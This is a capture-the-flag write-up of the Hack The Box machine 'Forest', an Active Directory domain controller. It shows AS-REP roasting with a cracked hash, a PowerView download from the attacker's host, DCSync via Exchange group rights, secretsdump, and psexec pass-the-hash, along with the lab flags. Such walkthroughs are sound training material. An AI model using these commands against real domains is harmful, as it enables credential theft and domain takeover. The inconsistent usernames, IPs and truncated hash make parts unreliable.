```json
Alias: Forest
Date: 02-08_2024
Platform: Hackthebox
OS: Windows
Difficulty: Easy
Status: Complete
IP: 10.129.253.150
```

# Forest
# Summary

- Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes.

# Used Tools

* GetNPUsers.py
* hashcat
* PowerView
 
---

# Information Gathering
## NMAP
```nmap
Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-02 19:35 PKT
Nmap scan report for 10.129.253.122
Host is up (0.27s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-02 14:42:36Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h26m50s, deviation: 4h02m30s, median: 6m49s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-08-02T07:42:55-07:00
| smb2-time:
|   date: 2024-08-02T14:42:58
|_  start_date: 2024-08-02T14:31:49

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.24 seconds
```
## Discovered Subdomains
```
htb.local
FOREST.htb.local
```

---
# Enumeration
## Port 389 - LDAP
Anonymous binding is enabled

- [x] Enumerated
- [x] Vulnerable


---

# Lateral Movement

## Local Enumeration
## AS-REP Roasting
Got AS-REP of user svc-afresco using GetNPUsers.py due to no Kerberos Pre-Auth Enabled. Cracked using hashcat.

```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:a70357f007f6cc40c181f69456d9b990$856f1557e97100e435a8192b3ddcddc84bf84b0aa1e8d11d641563180f1944f9b2d734151a50ad0d94bb962d50c4c08aa34353403a0e5a5482a86e372ae223ddfc567935ff21afb8bc16346632703df31d5c22d2aec0cf3af0c2ceec40bf18fffbef61a0117641b4e4c1ee0cbf0451f80edc8363bf8cd68f0120a1e38a0828ee295ae8618446e31bcbd0159e992d14e20b353ca69e36dc37741c05c5e4881b7c777d0aeaca85a8c3e31281b3323b417e8a0f184a2dbc7104e52337ae1f8f77bcd85615f4895866ad19690e3bc00a64ed3b252b6e0ad4cb0f4ba36ab31fbf854d6e283a6df7cf:s3rvice
```

## Lateral Movement Vector
The user svc_alfresco has winrm access to the machine granting us the user flag.

```bash
evil-winrm -i $IP -u svc-alfresco -p s3rvice
```

---

# Privilege Escalation

## Local Enumeration
We enumerate the environment using bloodhound to find vectors and we find that we are a part of the 'Privileged IT Accounts' group Which is in turn part of 'Exchange Windows Permissions'. This group has WriteDACL permission over the HTB.LOCAL domain.

![[Pasted image 20240803204217.png]]

## Privilege Escalation Vector
We start by downloading PowerView.ps1 on the target.
```powershell
(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.89:8000/PowerView.ps1", "C:\Users\svc-alfresco\PowerView.ps1")
```

We start by adding ourselves to 'Exchange Windows Permissions' group Leveraging the GenericAll our group 'Account Operators' has over it.

```powershell
net group "Exchange Windows Permissions" '0xfa11' /add
```

After which we can create a PSCredential Object and grant ourselves DCSync Rights.

```powershell
$SecPassword = ConvertTo-SecureString 'abc123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('0xfall', $SecPassword)
Add-ObjectACL -PrincipalIdentity '0xfa11' -Rights DCSync -Verbose -Credential $Cred
```

Next using secretsdump we can perform the DCSync

```bash
secretsdump.py htb/john@$IP
```

After getting the admin hash we can get a shell with psexec.py

```bash
aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

```bash
psexec.py administrator@$IP -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea
```

---

# Flags
- 93bd53056d7abf58152c8d37c9366a21
- a09a312e2c2e37f6b091cc914a0a55cd

#CTF #CTF/Hackthebox #CTF/Hackthebox/Easy  #Windows #ActiveDirectory #ActiveDirectory/DCSync
#ActiveDirectory/ASREPRoasting